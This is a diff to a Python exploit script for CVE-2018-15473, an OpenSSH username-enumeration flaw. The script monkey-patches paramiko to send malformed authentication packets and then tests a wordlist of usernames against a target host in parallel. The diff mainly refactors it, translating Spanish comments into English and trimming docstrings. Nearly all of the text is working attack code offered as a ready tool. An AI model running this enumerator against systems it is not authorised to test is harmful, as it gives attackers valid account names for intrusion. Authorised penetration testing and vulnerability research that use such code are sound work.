@@ -39,11 +39,7 @@ class InvalidUsername(Exception):
     """ Raise when username not found via CVE-2018-15473. """
 
 def apply_monkey_patch() -> None:
-    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST.
-        patches the following internal `AuthHandler` functions by updating the internal `_client_handler_table` dict
-            _parse_service_accept
-            _parse_userauth_failure
-    """
+    """ Monkey patch paramiko to send invalid SSH2_MSG_USERAUTH_REQUEST. """
 
     def patched_add_boolean(*args, **kwargs):
         """ Override correct behavior of paramiko.message.Message.add_boolean, used to produce malformed packets. """
@@ -51,9 +47,10 @@ def apply_monkey_patch() -> None:
 
     auth_handler = paramiko.auth_handler.AuthHandler
 
-    # Obtener el valor de la propiedad _client_handler_table
-    client_handler_table = auth_handler._client_handler_table
+    # Get the current handler table
+    client_handler_table = auth_handler._client_handler_table.copy()
 
+    # Get the original MSG_SERVICE_ACCEPT handler
     old_msg_service_accept = client_handler_table[paramiko.common.MSG_SERVICE_ACCEPT]
 
     def patched_msg_service_accept(*args, **kwargs):
@@ -67,21 +64,17 @@ def apply_monkey_patch() -> None:
         """ Called during authentication when a username is not found. """
         raise InvalidUsername(*args, **kwargs)
 
-    # Crear una copia del diccionario y actualizarlo
-    patched_handler_table = client_handler_table.copy()
-    patched_handler_table.update({
+    # Update the handler table with the patched functions
+    client_handler_table.update({
         paramiko.common.MSG_SERVICE_ACCEPT: patched_msg_service_accept,
         paramiko.common.MSG_USERAUTH_FAILURE: patched_userauth_failure
     })
 
-    # Establecer la propiedad _client_handler_table con la tabla parcheada
-    auth_handler._client_handler_table = patched_handler_table
+    # Set the patched handler table back
+    auth_handler._client_handler_table = client_handler_table
 
 def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
-    """ Small helper to stay DRY.
-    Returns:
-        socket.socket or None
-    """
+    """ Small helper to stay DRY. """
     try:
         return socket.create_connection((hostname, port))
     except socket.error as e:
@@ -89,15 +82,7 @@ def create_socket(hostname: str, port: int) -> Union[socket.socket, None]:
         return None
 
 def connect(username: str, hostname: str, port: int, verbose: bool = False) -> None:
-    """ Connect and attempt keybased auth, result interpreted to determine valid username.
-    Args:
-        username:   username to check against the ssh service
-        hostname:   hostname/IP of target
-        port:       port where ssh is listening
-        verbose:    bool value; determines whether to print 'not found' lines or not
-    Returns:
-        None
-    """
+    """ Connect and attempt key-based auth, result interpreted to determine valid username. """
     sock = create_socket(hostname, port)
     if not sock:
         return
@@ -119,14 +104,13 @@ def connect(username: str, hostname: str, port: int, verbose: bool = False) -> N
             print(f'[-] {Color.string(username, color="red")} no encontrado')
 
 def main():
-    """ main entry point for the program """
+    """ Main entry point for the program """
     parser = argparse.ArgumentParser(description="OpenSSH Username Enumeration (CVE-2018-15473)")
 
     parser.add_argument('hostname', help='target to enumerate', type=str)
     parser.add_argument('-p', '--port', help='ssh port (default: 22)', default=22, type=int)
     parser.add_argument('-t', '--threads', help="number of threads (default: 4)", default=4, type=int)
-    parser.add_argument('-v', '--verbose', action='store_true', default=False,
-                        help="print both valid and invalid usernames (default: False)")
+    parser.add_argument('-v', '--verbose', action='store_true', default=False, help="print both valid and invalid usernames (default: False)")
     parser.add_argument('-6', '--ipv6', action='store_true', help="Specify use of an ipv6 address (default: ipv4)")
 
     multi_or_single_group = parser.add_mutually_exclusive_group(required=True)
@@ -163,10 +147,7 @@ def main():
 
     with multiprocessing.Pool(args.threads) as pool:
         with Path(args.wordlist).open() as usernames:
-            host = args.hostname
-            port = args.port
-            verbose = args.verbose
-            pool.starmap(connect, [(user.strip(), host, port, verbose) for user in usernames])
+            pool.starmap(connect, [(user.strip(), args.hostname, args.port, args.verbose) for user in usernames])
 
 if __name__ == '__main__':
     main()
